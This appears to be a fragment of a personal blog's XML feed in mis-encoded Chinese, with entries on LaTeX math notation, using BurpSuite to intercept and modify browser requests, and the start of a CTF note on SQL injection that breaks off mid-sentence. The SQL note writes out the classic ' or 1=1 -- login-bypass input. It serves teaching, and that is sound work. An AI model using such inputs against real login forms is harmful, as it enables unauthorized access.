y$</li><li>å®æ•°é›†åˆï¼Œç¬¦å·ï¼š<code>\mathbb&#123;R&#125;</code>ï¼Œå¦‚ï¼š$\mathbb{R}$</li><li>è‡ªç„¶æ•°é›†åˆï¼Œç¬¦å·ï¼š<code>\mathbb&#123;Z&#125;</code>ï¼Œå¦‚ï¼š$\mathbb{Z}$</li><li>ç©ºé›†ï¼Œç¬¦å·ï¼š<code>\emptyset</code>ï¼Œå¦‚ï¼š$\emptyset$</li></ol><h3 id="æ•°å­¦ç¬¦å·"><a href="#æ•°å­¦ç¬¦å·" class="headerlink" title="æ•°å­¦ç¬¦å·"></a>æ•°å­¦ç¬¦å·</h3><ol><li>æ— ç©·ï¼Œç¬¦å·ï¼š<code>\infty</code>ï¼Œå¦‚ï¼š$\infty$</li><li>è™šæ•°ï¼Œç¬¦å·ï¼š<code>\imath</code>ï¼Œå¦‚ï¼š$\imath$</li><li>è™šæ•°ï¼Œç¬¦å·ï¼š<code>\jmath</code>ï¼Œå¦‚ï¼š$\jmath$</li><li>è™šæ•°ï¼Œç¬¦å·ï¼š<code>\prime</code>ï¼Œå¦‚ï¼š$\prime$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\hat&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\hat{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\check&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\check{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\breve&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\breve{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\tilde&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\tilde{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\bar&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\bar{a}$</li><li>çŸ¢é‡ç¬¦å·ï¼Œç¬¦å·<code>\vec&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\vec{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\acute&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\acute{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\grave&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\grave{a}$</li><li>æ•°å­¦ç¬¦å·ï¼Œç¬¦å·<code>\mathring&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\mathring{a}$</li><li>ä¸€é˜¶å¯¼æ•°ç¬¦å·ï¼Œç¬¦å·<code>\dot&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\dot{a}$</li><li>äºŒé˜¶å¯¼æ•°ç¬¦å·ï¼Œç¬¦å·<code>\ddot&#123;a&#125;</code>ï¼Œå¦‚ï¼š$\ddot{a}$</li><li>ä¸Šç®­å¤´ï¼Œç¬¦å·ï¼š<code>\uparrow</code>ï¼Œå¦‚ï¼š$\uparrow$</li><li>ä¸Šç®­å¤´ï¼Œç¬¦å·ï¼š<code>\Uparrow</code>ï¼Œå¦‚ï¼š$\Uparrow$</li><li>ä¸‹ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\downarrow</code>ï¼Œå¦‚ï¼š$\downarrow$</li><li>ä¸‹ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\Downarrow</code>ï¼Œå¦‚ï¼š$\Downarrow$</li><li>å·¦ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\leftarrow</code>ï¼Œå¦‚ï¼š$\leftarrow$</li><li>å·¦ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\Leftarrow</code>ï¼Œå¦‚ï¼š$\Leftarrow$</li><li>å³ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\rightarrow</code>ï¼Œå¦‚ï¼š$\rightarrow$</li><li>å³ç®­å¤´ï¼Œç¬¦å·ï¼š<code>\Rightarrow</code>ï¼Œå¦‚ï¼š$\Rightarrow$</li><li>åº•ç«¯å¯¹é½çš„çœç•¥å·ï¼Œç¬¦å·ï¼š<code>\ldots</code>ï¼Œå¦‚ï¼š$1,2,\ldots,n$</li><li>ä¸­çº¿å¯¹é½çš„çœç•¥å·ï¼Œç¬¦å·ï¼š<code>\cdots</code>ï¼Œå¦‚ï¼š$x_1^2 + x_2^2 + \cdots + x_n^2$</li><li>ç«–ç›´å¯¹é½çš„çœç•¥å·ï¼Œç¬¦å·ï¼š<code>\vdots</code>ï¼Œå¦‚ï¼š$\vdots$</li><li>æ–œå¯¹é½çš„çœç•¥å·ï¼Œç¬¦å·ï¼š<code>\ddots</code>ï¼Œå¦‚ï¼š$\ddots$</li></ol><h3 id="å¸Œè…Šå­—æ¯"><a href="#å¸Œè…Šå­—æ¯" class="headerlink" title="å¸Œè…Šå­—æ¯"></a>å¸Œè…Šå­—æ¯</h3><div class="table-container"><table><thead><tr><th>å­—æ¯</th><th>ä»£ç </th><th>å­—æ¯</th><th>ä»£ç </th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>Î±</td><td><code>\alpha</code></td></tr><tr><td>B</td><td><code>B</code></td><td>Î²</td><td><code>\beta</code></td></tr><tr><td>Î“</td><td><code>\Gamma</code></td><td>Î³</td><td><code>\gamma</code></td></tr><tr><td>Î”</td><td><code>\Delta</code></td><td>Î´</td><td><code>\delta</code></td></tr><tr><td>E</td><td><code>E</code></td><td>Ïµ</td><td><code>\epsilon</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>Î¶</td><td><code>\zeta</code></td></tr><tr><td>H</td><td><code>H</code></td><td>Î·</td><td><code>\eta</code></td></tr><tr><td>Î˜</td><td><code>\Theta</code></td><td>Î¸</td><td><code>\theta</code></td></tr><tr><td>I</td><td><code>I</code></td><td>Î¹</td><td><code>\iota</code></td></tr><tr><td>K</td><td><code>K</code></td><td>Îº</td><td><code>\kappa</code></td></tr><tr><td>Î›</td><td><code>\Lambda</code></td><td>Î»</td><td><code>\lambda</code></td></tr><tr><td>M</td><td><code>M</code></td><td>Î¼</td><td><code>\mu</code></td></tr><tr><td>N</td><td><code>N</code></td><td>Î½</td><td><code>\nu</code></td></tr><tr><td>Î</td><td><code>\Xi</code></td><td>Î¾</td><td><code>\xi</code></td></tr><tr><td>O</td><td><code>O</code></td><td>Î¿</td><td><code>\omicron</code></td></tr><tr><td>Î </td><td><code>\Pi</code></td><td>Ï€</td><td><code>\pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>Ï</td><td><code>\rho</code></td></tr><tr><td>Î£</td><td><code>\Sigma</code></td><td>Ïƒ</td><td><code>\sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>Ï„</td><td><code>\tau</code></td></tr><tr><td>Î¥</td><td><code>\Upsilon</code></td><td>Ï…</td><td><code>\upsilon</code></td></tr><tr><td>Î¦</td><td><code>\Phi</code></td><td>Ï•</td><td><code>\phi</code></td></tr><tr><td>X</td><td><code>X</code></td><td>Ï‡</td><td><code>\chi</code></td></tr><tr><td>Î¨</td><td><code>\Psi</code></td><td>Ïˆ</td><td><code>\psi</code></td></tr><tr><td>Î©</td><td><code>\Omega</code></td><td>Ï‰</td><td><code>\omega</code></td></tr><tr><td></td><td></td><td>Îµ</td><td><code>\varepsilon</code></td></tr></tbody></table></div><h3 id="ç¼–å·"><a href="#ç¼–å·" class="headerlink" title="ç¼–å·"></a>ç¼–å·</h3><script type="math/tex; mode=display">e^{i\theta}=\cos \theta+\sin \theta i \tag{1}</script><h3 id="çŸ©é˜µ"><a href="#çŸ©é˜µ" class="headerlink" title="çŸ©é˜µ"></a>çŸ©é˜µ</h3><p><strong>ä¸å¸¦æ‹¬å·çš„çŸ©é˜µ</strong></p><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\begin&#123;matrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;matrix&#125;<br>\tag&#123;1&#125;<br>$$<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{matrix}\tag{1}</script><p><strong>å¸¦æ‹¬å·çš„çŸ©é˜µ</strong></p><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\left[<br>\begin&#123;matrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;matrix&#125;<br>\right]<br>\tag&#123;2&#125;<br>$$<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{matrix}\right]\tag{2}</script><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\begin&#123;bmatrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;bmatrix&#125;<br>\tag&#123;2&#125;<br>$$<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">\begin{bmatrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{bmatrix}\tag{2}</script><div class="table-container"><table><thead><tr><th>ç¬¦å·</th><th>å½¢å¼</th></tr></thead><tbody><tr><td>pmatrix</td><td>(1234)</td></tr><tr><td>bmatrix</td><td>[1234]</td></tr><tr><td>Bmatrix</td><td>{1234}</td></tr><tr><td>vmatrix</td><td>\</td><td>1234\</td><td></td></tr><tr><td>Vmatrix</td><td>\</td><td>\</td><td>1 3 2 4\</td><td>\</td></tr></tbody></table></div><h3 id="åˆ†æ®µå‡½æ•°"><a href="#åˆ†æ®µå‡½æ•°" class="headerlink" title="åˆ†æ®µå‡½æ•°"></a>åˆ†æ®µå‡½æ•°</h3><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>å‡½æ•°å=<br>\begin&#123;cases&#125;<br>å…¬å¼1 &amp; æ¡ä»¶1 \\<br>å…¬å¼2 &amp; æ¡ä»¶2 \\<br>å…¬å¼3 &amp; æ¡ä»¶3 <br>\end&#123;cases&#125;<br>$$<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>&amp;</code> è¡¨ç¤ºå¯¹é½ï¼Œ <code>\\</code> ç”¨æ¥è¡¨ç¤ºæ¢è¡Œ ã€‚</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">å‡½æ•°å=\begin{cases}å…¬å¼1 & æ¡ä»¶1 \\å…¬å¼2 & æ¡ä»¶2 \\å…¬å¼3 & æ¡ä»¶3 \end{cases}</script><details>  <summary> ç‚¹å‡»æ­¤åŒºåŸŸæ ‡é¢˜ï¼šæŸ¥çœ‹è¯¦ç»†å†…å®¹ </summary>  <p> - æµ‹è¯•æ–‡æœ¬æ®µè½ </p>  <pre><code>  titleï¼Œvalueï¼ŒcallBackå¯ä»¥ç¼ºçœ  </code>  </pre></details><h2 id="Markdownæµç¨‹å›¾"><a href="#Markdownæµç¨‹å›¾" class="headerlink" title="Markdownæµç¨‹å›¾"></a>Markdownæµç¨‹å›¾</h2>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite</title>
    <link href="/2021/08/17/CTF/Web/Tools/BurpSuite/"/>
    <url>/2021/08/17/CTF/Web/Tools/BurpSuite/</url>
    
    <content type="html"><![CDATA[<p>ï¼ˆæ¨èä½¿ç”¨ <strong>FoxyProry</strong> è¿›è¡Œä»£ç†ï¼Œç›¸å½“å¥½ç”¨ï¼‰</p><h2 id="Burpsuiteç¥å¥‡å¸¸ç”¨åŠŸèƒ½ä½¿ç”¨æ–¹æ³•æ€»ç»“"><a href="#Burpsuiteç¥å¥‡å¸¸ç”¨åŠŸèƒ½ä½¿ç”¨æ–¹æ³•æ€»ç»“" class="headerlink" title="Burpsuiteç¥å¥‡å¸¸ç”¨åŠŸèƒ½ä½¿ç”¨æ–¹æ³•æ€»ç»“"></a>Burpsuiteç¥å¥‡å¸¸ç”¨åŠŸèƒ½ä½¿ç”¨æ–¹æ³•æ€»ç»“</h2><p>Burpsuiteä»‹ç»ï¼š</p><p>ä¸€æ¬¾å¯ä»¥è¿›è¡Œå†WEBåº”ç”¨ç¨‹åºçš„é›†æˆæ”»å‡»æµ‹è¯•å¹³å°ã€‚(æŠ“httpsè¦åœ¨æµè§ˆå™¨ä¸­å¯¼å…¥è¯ä¹¦)</p><h3 id="1ã€å­¦ä¹ Proxy"><a href="#1ã€å­¦ä¹ Proxy" class="headerlink" title="1ã€å­¦ä¹ Proxy"></a>1ã€å­¦ä¹ Proxy</h3><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160104503-1695107907.png" alt="img"></p><p>é¦–å…ˆçœ‹æ ‡çº¢ï¼Œintercept is on ä¸ºæ‹¦æˆªçŠ¶æ€ å…¶å¯¹åº”çš„intercept is off ä¸ºéæ‹¦æˆªçŠ¶æ€,è®¾ç½®å®Œä»£ç†åæ‰“å¼€æ‹¦æˆªçŠ¶æ€ï¼Œæµè§ˆå™¨å‘èµ·çš„è¯·æ±‚ä¼šè¢«burpsuiteæ‰€æ‹¦æˆª</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160113915-1680360524.png" alt="img"></p><p>forward: è¿›è¡Œè¯·æ±‚åè¢«æ‹¦æˆªï¼Œç‚¹å‡»forwardå¯ä»¥ç»§ç»­æ­¤æ¬¡è¯·æ±‚ï¼Œå¦‚æœä½ ç‚¹å‡»dropåˆ™ä¸¢å¼ƒæ­¤è¯·æ±‚æ•°æ®ã€‚ç»§ç»­è¯·æ±‚åèƒ½å¤Ÿçœ‹åˆ°è¿”å›ç»“æœ</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160120925-1705436205.png" alt="img"></p><p>å¯ä»¥åœ¨æ¶ˆæ¯åˆ†æé€‰é¡¹å¡æŸ¥çœ‹è¿™æ¬¡è¯·æ±‚çš„æ‰€æœ‰å†…å®¹</p><p>1ï¼‰Raw è¿™ä¸ªè§†å›¾ä¸»è¦æ˜¾ç¤ºwebè¯·æ±‚çš„rawæ ¼å¼ï¼ŒåŒ…å«è¯·æ±‚åœ°å€ï¼Œ httpåè®®ç‰ˆæœ¬ï¼Œ ä¸»æœºå¤´ï¼Œ æµè§ˆå™¨ä¿¡æ¯ï¼Œacceptå¯æ¥å—çš„å†…å®¹ç±»å‹ï¼Œå­—ç¬¦é›†ï¼Œç¼–ç æ–¹å¼ï¼Œcookiesç­‰,  å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹è¿™äº›å†…å®¹ï¼Œç„¶ååœ¨ç‚¹å‡»forwardè¿›è¡Œæ¸—é€æµ‹è¯•</p><p>2ï¼‰ params è¿™ä¸ªè§†å›¾ä¸»è¦æ˜¯æ˜¾ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„å‚æ•°ä¿¡æ¯ï¼Œgetæˆ–è€…postçš„å‚æ•°ï¼Œcookieså‚æ•°ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹</p><p>3ï¼‰headersæ˜¯å¤´éƒ¨ä¿¡æ¯å’ŒRawå…¶å®å·®ä¸å¤šï¼Œå±•ç¤ºæ›´ç›´è§‚</p><p>4ï¼‰Hex è¿™ä¸ªè§†å›¾æ˜¾ç¤ºRawçš„äºŒè¿›åˆ¶å†…å®¹</p><p>æ³¨æ„ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼ŒBurpProxyåªæ‹¦æˆªè¯·æ±‚çš„æ¶ˆæ¯ï¼Œæ™®é€šçš„æ–‡ä»¶å¦‚css,js,å›¾ç‰‡æ˜¯ä¸ä¼šæ‹¦æˆªçš„ï¼Œå½“ç„¶ï¼Œæƒ³æ‹¦æˆªä»€ä¹ˆéƒ½å¯ä»¥è®¾ç½®,æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†æ€ä¹ˆè®¾ç½®ä»£ç†ï¼Œæ€ä¹ˆå®‰è£…ï¼Œæ€ä¹ˆè¿›è¡Œè¯·æ±‚æ‹¦æˆªï¼Œæ€ä¹ˆä¿®æ”¹è¯·æ±‚å‘èµ·çš„å†…å®¹å‘æœåŠ¡ç«¯è¿›è¡Œæ¸—é€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹æ€ä¹ˆæ§åˆ¶è¿™äº›æ‹¦æˆª</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160131806-1628996900.png" alt="img"></p><p>ä¸Šå›¾ä¸ºhttp history æ‰€æœ‰æ‹¦æˆªçš„å†å²å‡ä¼šè¢«è®°å½•èµ·æ¥</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160139665-729908590.png" alt="img"></p><p>Burp Proxyçš„æ‹¦æˆªåŠŸèƒ½ä¸»è¦ç”±Intercepté€‰é¡¹å¡ä¸­çš„Forwardã€Dropã€Interception is on/offã€Actionæ„æˆï¼Œå®ƒä»¬çš„åŠŸèƒ½åˆ†åˆ«æ˜¯ï¼š Forwardçš„åŠŸèƒ½æ˜¯å½“ä½ æŸ¥çœ‹è¿‡æ¶ˆæ¯æˆ–è€…é‡æ–°ç¼–è¾‘è¿‡æ¶ˆæ¯ä¹‹åï¼Œç‚¹å‡»æ­¤æŒ‰é’®ï¼Œå°†å‘é€æ¶ˆæ¯è‡³æœåŠ¡å™¨ç«¯ã€‚ Dropçš„åŠŸèƒ½æ˜¯ä½ æƒ³ä¸¢å¤±å½“å‰æ‹¦æˆªçš„æ¶ˆæ¯ï¼Œä¸å†forwardåˆ°æœåŠ¡å™¨ç«¯ã€‚Interception is onè¡¨ç¤ºæ‹¦æˆªåŠŸèƒ½æ‰“å¼€ï¼Œæ‹¦æˆªæ‰€æœ‰é€šè¿‡Burp Proxyçš„è¯·æ±‚æ•°æ®ï¼›Interception is offè¡¨ç¤ºæ‹¦æˆªåŠŸèƒ½å…³é—­ï¼Œä¸å†æ‹¦æˆªé€šè¿‡Burp Proxyçš„æ‰€æœ‰è¯·æ±‚æ•°æ®ã€‚ Actionçš„åŠŸèƒ½æ˜¯é™¤äº†å°†å½“å‰è¯·æ±‚çš„æ¶ˆæ¯ä¼ é€’åˆ°Spiderã€Scannerã€Repeaterã€Intruderã€Sequencerã€Decoderã€Comparerç»„ä»¶å¤–ï¼Œè¿˜å¯ä»¥åšä¸€äº›è¯·æ±‚æ¶ˆæ¯çš„ä¿®æ”¹ï¼Œå¦‚æ”¹å˜GETæˆ–è€…POSTè¯·æ±‚æ–¹å¼ã€æ”¹å˜è¯·æ±‚bodyçš„ç¼–ç ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ”¹å˜è¯·æ±‚æ¶ˆæ¯çš„æ‹¦æˆªè®¾ç½®ï¼Œå¦‚ä¸å†æ‹¦æˆªæ­¤ä¸»æœºçš„æ¶ˆæ¯ã€ä¸å†æ‹¦æˆªæ­¤IPåœ°å€çš„æ¶ˆæ¯ã€ä¸å†æ‹¦æˆªæ­¤ç§æ–‡ä»¶ç±»å‹çš„æ¶ˆæ¯ã€ä¸å†æ‹¦æˆªæ­¤ç›®å½•çš„æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šé’ˆå¯¹æ­¤æ¶ˆæ¯æ‹¦æˆªå®ƒçš„æœåŠ¡å™¨ç«¯è¿”å›æ¶ˆæ¯ã€‚                                                      </p><h3 id="2ã€burpsuiteä½¿ç”¨ï¼ˆæŠ“åŒ…ã€æˆªåŒ…ã€æ”¹åŒ…ï¼‰"><a href="#2ã€burpsuiteä½¿ç”¨ï¼ˆæŠ“åŒ…ã€æˆªåŒ…ã€æ”¹åŒ…ï¼‰" class="headerlink" title="2ã€burpsuiteä½¿ç”¨ï¼ˆæŠ“åŒ…ã€æˆªåŒ…ã€æ”¹åŒ…ï¼‰"></a>2ã€burpsuiteä½¿ç”¨ï¼ˆæŠ“åŒ…ã€æˆªåŒ…ã€æ”¹åŒ…ï¼‰</h3><p>è¿™é‡Œæ¨èç«ç‹æµè§ˆå™¨æ¥é…åˆburpä½¿ç”¨ã€‚</p><h4 id="1ï¼‰è®¾ç½®æµè§ˆå™¨"><a href="#1ï¼‰è®¾ç½®æµè§ˆå™¨" class="headerlink" title="1ï¼‰è®¾ç½®æµè§ˆå™¨"></a>1ï¼‰è®¾ç½®æµè§ˆå™¨</h4><p>å·¥å…·-é€‰é¡¹-ç½‘ç»œè®¾ç½®-è®¾ç½®ï¼Œå°†è¿æ¥è®¾ç½®æ”¹ä¸ºæ‰‹åŠ¨ä»£ç†é…ç½®</p><p><img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160150670-1031551237.png" alt="img"></p><p>è¾“å…¥127.0.0.1:8080ï¼Œç‚¹å‡»å›è½¦ï¼Œè¿›å…¥burpè¯ä¹¦ä¸‹è½½é¡µé¢</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160155678-504532104.png" alt="img"></p><p>ç‚¹å‡»å³ä¸Šè§’ï¼Œä¸‹è½½è¯ä¹¦</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160201159-1809790672.png" alt="img"></p><p>åœ¨é€‰é¡¹é‡Œæœç´¢è¯ä¹¦ï¼Œç‚¹å‡»ã€æŸ¥çœ‹è¯ä¹¦ã€‘</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160207200-175891539.png" alt="img"></p><p>ç‚¹å‡»ã€å¯¼å…¥ã€‘ï¼Œå¯¼å…¥åˆšåˆšä¸‹è½½çš„burpè¯ä¹¦ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨burpæŠ“å–httpsè¯·æ±‚äº†</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160216204-41674101.png" alt="img"></p><p>è¿™æ—¶å€™è®¡ç®—æœºä¸Šçš„ç«ç‹æµè§ˆå™¨ä¹Ÿè®¾ç½®ä¸ºäº†ä»£ç†æ¨¡å¼ã€‚ä»£ç†è®¾ç½®æˆåŠŸä¹‹åï¼Œè®¿é—®ç½‘é¡µæ˜¯è®¿é—®ä¸äº†çš„ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å°†è¯·æ±‚è½¬å‘ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦é…ç½®burpæ¥è½¬å‘æµè§ˆå™¨çš„è¯·æ±‚ã€‚</p><h4 id="2ï¼‰é…ç½®burpç›‘å¬ç«¯å£"><a href="#2ï¼‰é…ç½®burpç›‘å¬ç«¯å£" class="headerlink" title="2ï¼‰é…ç½®burpç›‘å¬ç«¯å£"></a>2ï¼‰é…ç½®burpç›‘å¬ç«¯å£</h4><p>ç„¶åæ‰“å¼€burp</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160225830-953931912.png" alt="img"></p><p>åœ¨ç›‘å¬çš„ç«¯å£è®¾ç½®ä¸ä»£ç†çš„ç«¯å£ç›¸åŒ</p><h4 id="3ï¼‰æŠ“åŒ…"><a href="#3ï¼‰æŠ“åŒ…" class="headerlink" title="3ï¼‰æŠ“åŒ…"></a>3ï¼‰æŠ“åŒ…</h4><p> å°†burpè®¾ç½®ä¸ºIntercept is onï¼Œåœ¨ç«ç‹æµè§ˆå™¨é‡Œè¾“å…¥baike.baidu.com</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160240235-13829037.png" alt="img"></p><p>å°†Intercept is onè®¾ç½®ä¸ºIntercept is off</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160257914-1241773243.png" alt="img"></p><h4 id="4ï¼‰æˆªåŒ…"><a href="#4ï¼‰æˆªåŒ…" class="headerlink" title="4ï¼‰æˆªåŒ…"></a>4ï¼‰æˆªåŒ…</h4><p>è¿™æ—¶å€™å°±éœ€è¦æ‰“å¼€æ‹¦æˆªåŠŸèƒ½äº†</p><p>ä¹‹å‰åœ¨æŠ“åŒ…çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œç™¾åº¦æœç´¢ä¸€æ¬¡è¦å‘é€å¾ˆå¤šä¸ªè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™åœç•™åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸Šé¢ï¼Œè¿™æ—¶å€™ï¼Œå¦‚æœä¸å¬åœ°ç‚¹å‡»forwardçš„è¯ï¼Œå°±ä¼šä¸€ç›´å‘é€æ¥ä¸‹æ¥çš„è¯·æ±‚ã€‚å¦‚æœä¸åœç‚¹å‡»dropï¼Œå°±ä¼šæŠŠè¿™äº›è¯·æ±‚çš„åŒ…ä¸€ä¸ªä¸ªä¸¢æ‰ã€‚</p><h4 id="5ï¼‰æ”¹åŒ…"><a href="#5ï¼‰æ”¹åŒ…" class="headerlink" title="5ï¼‰æ”¹åŒ…"></a>5ï¼‰æ”¹åŒ…</h4><p>æ¯”å¦‚æ°´æœç½‘<a href="http://www.guo68.com/æœç´¢æ°´æœï¼špingguoï¼ˆæœç´¢ä¸­æ–‡çš„æ—¶å€™æŠ“çš„åŒ…æ˜¯ä¹±ç ï¼Œä¸åˆ©è§‚å¯Ÿï¼‰">http://www.guo68.com/æœç´¢æ°´æœï¼špingguoï¼ˆæœç´¢ä¸­æ–‡çš„æ—¶å€™æŠ“çš„åŒ…æ˜¯ä¹±ç ï¼Œä¸åˆ©è§‚å¯Ÿï¼‰</a></p><p>ä¸€ç›´ç‚¹å‡»forwardï¼Œå¹¶ä¸”æŸ¥çœ‹paramsé€‰é¡¹ï¼Œç›´åˆ°å‚æ•°çš„å†…å®¹ä¸­å‡ºç°pingguo</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160313306-2042683578.png" alt="img"></p><p>è¿™æ—¶å€™æŠŠpingguoæ”¹æˆputaoï¼Œç»§ç»­ç‚¹å‡»forwardæˆ–è€…å…³é—­æ‹¦æˆªåŠŸèƒ½ã€‚</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160321035-1828655767.png" alt="img"></p><p>ä¾¿ä¼šæœç´¢putaoäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>BurpSuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>BurpSuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="/2021/08/14/CTF/Web/Notes/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/08/14/CTF/Web/Notes/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-SQLæ³¨å…¥åŸç†"><a href="#0x01-SQLæ³¨å…¥åŸç†" class="headerlink" title="0x01 SQLæ³¨å…¥åŸç†"></a>0x01 SQLæ³¨å…¥åŸç†</h1><p>åœ¨ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºä¸­ï¼Œç”¨æˆ·çš„è¾“å…¥æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œæ‰§è¡Œäº†ä¸åŸå®šè®¡åˆ’ä¸åŒçš„è¡Œä¸ºï¼Œä»è€Œäº§ç”Ÿäº† SQL æ³¨å…¥æ¼æ´ ã€‚</p><p>ç™»å½• SQL è¯­å¥ï¼š</p><p>select * from admin where username = â€˜ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åâ€™ and password = â€˜ç”¨æˆ·è¾“å…¥çš„å¯†ç â€™ </p><p>ç”¨æˆ·è¾“å…¥çš„å†…å®¢å¯ç”±ç”¨æˆ·è‡ªè¡Œæ§åˆ¶ï¼Œä¾‹å¦‚å¯ä»¥æ„‰å…¥ â€˜ or 1=1 â€” ç©ºæ ¼</p><p>SQL è¯­å¥ï¼š</p><p>select * from admin where username = â€˜â€™ or 1=1 â€” â€˜ and password = â€˜ç”¨æˆ·è¾“å…¥çš„å¯†ç â€™ </p><p>å…¶ä¸­ or 1=1 